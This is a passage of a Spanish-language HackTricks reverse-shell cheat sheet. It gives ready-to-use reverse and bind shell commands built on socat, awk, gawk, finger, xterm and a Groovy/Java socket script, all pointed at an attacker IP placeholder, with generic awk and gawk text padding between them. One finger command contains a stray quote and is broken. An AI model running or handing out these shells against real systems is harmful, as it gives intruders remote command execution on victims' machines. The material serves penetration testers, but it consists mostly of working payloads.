2. El atacante carga un programa o script en la máquina comprometida que establece una conexión de red con el atacante.
3. El atacante configura un puerto y una dirección IP para recibir la conexión entrante.
4. La máquina comprometida se conecta al atacante a través de la dirección IP y el puerto especificados.
5. Una vez establecida la conexión, el atacante puede enviar comandos al objetivo y recibir la salida correspondiente.

El uso de un shell inverso puede ser beneficioso para los hackers, ya que les permite evadir las restricciones de firewall y NAT, y también les permite mantener una comunicación persistente con la máquina comprometida.

Es importante tener en cuenta que el uso de un shell inverso sin el consentimiento del propietario del sistema objetivo es ilegal y está sujeto a sanciones legales. Esta técnica solo debe utilizarse con fines educativos o en el contexto de pruebas de seguridad autorizadas.
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
## Awk

Awk es una herramienta de procesamiento de texto que se utiliza comúnmente en sistemas Linux. Permite buscar y manipular datos en archivos de texto de una manera eficiente y flexible.

### Sintaxis básica

La sintaxis básica de Awk es la siguiente:

```bash
awk 'patrón {acción}' archivo
```

- `patrón` es una expresión que define qué líneas del archivo se deben procesar.
- `acción` es el conjunto de comandos que se ejecutarán en las líneas que coinciden con el patrón.

### Ejemplos de uso

A continuación se presentan algunos ejemplos de uso de Awk:

- Imprimir todas las líneas de un archivo:

```bash
awk '{print}' archivo
```

- Imprimir la primera columna de un archivo:

```bash
awk '{print $1}' archivo
```

- Filtrar líneas que contienen una palabra específica:

```bash
awk '/palabra/ {print}' archivo
```

- Calcular el promedio de una columna numérica:

```bash
awk '{sum += $1} END {print sum/NR}' archivo
```

### Conclusiones

Awk es una herramienta poderosa para el procesamiento de texto en sistemas Linux. Su sintaxis simple y flexible lo hace útil para una amplia gama de tareas, desde la manipulación básica de archivos hasta el procesamiento avanzado de datos.
```bash
awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```
El atacante puede utilizar el comando `finger` para obtener información sobre los usuarios de un sistema Linux. El comando `finger` muestra detalles como el nombre de usuario, el nombre completo, la última vez que se conectaron, la ubicación y otra información relevante. Esta información puede ser útil para el atacante al realizar un reconocimiento inicial del sistema y seleccionar posibles objetivos para el ataque.

El comando `finger` se utiliza de la siguiente manera:

```
finger [opciones] [nombre de usuario]
```

Algunas opciones comunes incluyen:

- `-l`: Muestra información detallada sobre el usuario.
- `-s`: Muestra información resumida sobre el usuario.
- `-p`: Muestra información sobre el plan del usuario.

Es importante tener en cuenta que no todos los sistemas tienen el comando `finger` instalado y algunos sistemas pueden tener restricciones de seguridad que limitan su uso. Por lo tanto, es necesario verificar la disponibilidad y los permisos antes de utilizar este comando en un sistema objetivo.
```bash
while true; do nc -l 79; done
```
Para enviar el comando, escríbelo, presiona enter y luego presiona CTRL+D (para detener STDIN)

**Víctima**
```bash
export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null')`; sleep 1; done

export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null | grep '!'|sed 's/^!//')`; sleep 1; done
```
## Gawk

Gawk es una herramienta de procesamiento de texto que se utiliza comúnmente en sistemas Linux. Es una implementación del lenguaje de programación Awk y se utiliza para buscar y manipular datos en archivos de texto.

Gawk se ejecuta desde la línea de comandos y se utiliza principalmente para realizar operaciones de filtrado y transformación en archivos de texto. Puede buscar patrones específicos en un archivo y realizar acciones basadas en esos patrones.

Una de las características más poderosas de Gawk es su capacidad para procesar archivos de texto estructurados en columnas. Puede especificar el delimitador de campo y realizar operaciones en columnas específicas.

Gawk también admite la programación de scripts, lo que le permite escribir programas más complejos para manipular datos. Puede utilizar variables, bucles y condicionales para realizar operaciones más avanzadas en los archivos de texto.

En resumen, Gawk es una herramienta poderosa para el procesamiento de texto en sistemas Linux. Puede buscar y manipular datos en archivos de texto, realizar operaciones en columnas y escribir scripts para realizar tareas más complejas.
```bash
#!/usr/bin/gawk -f

BEGIN {
Port    =       8080
Prompt  =       "bkd> "

Service = "/inet/tcp/" Port "/0/0"
while (1) {
do {
printf Prompt |& Service
Service |& getline cmd
if (cmd) {
while ((cmd |& getline) > 0)
print $0 |& Service
close(cmd)
}
} while (cmd != "exit")
close(Service)
}
}
```
## Xterm

Una de las formas más simples de shell inverso es una sesión de xterm. El siguiente comando debe ejecutarse en el servidor. Intentará conectarse de vuelta a ti (10.0.0.1) en el puerto TCP 6001.
```bash
xterm -display 10.0.0.1:1
```
Para capturar el xterm entrante, inicie un X-Server (:1 - que escucha en el puerto TCP 6001). Una forma de hacer esto es con Xnest (que se ejecutará en su sistema):
```bash
Xnest :1
```
Necesitarás autorizar al objetivo para que se conecte contigo (comando también ejecutado en tu host):
```bash
xhost +targetip
```
## Groovy

por [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) NOTA: Las shells inversas de Java también funcionan para Groovy.
```bash
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
## Bibliografía

{% embed url="https://highon.coffee/blog/reverse-shell-cheat-sheet/" %}

{% embed url="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell" %}

{% embed url="https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/" %}

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md" %}

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Encuentra las vulnerabilidades que más importan para que puedas solucionarlas más rápido. Intruder rastrea tu superficie de ataque, realiza escaneos de amenazas proactivas, encuentra problemas en toda tu pila tecnológica, desde APIs hasta aplicaciones web y sistemas en la nube. [**Pruébalo gratis**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) hoy.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
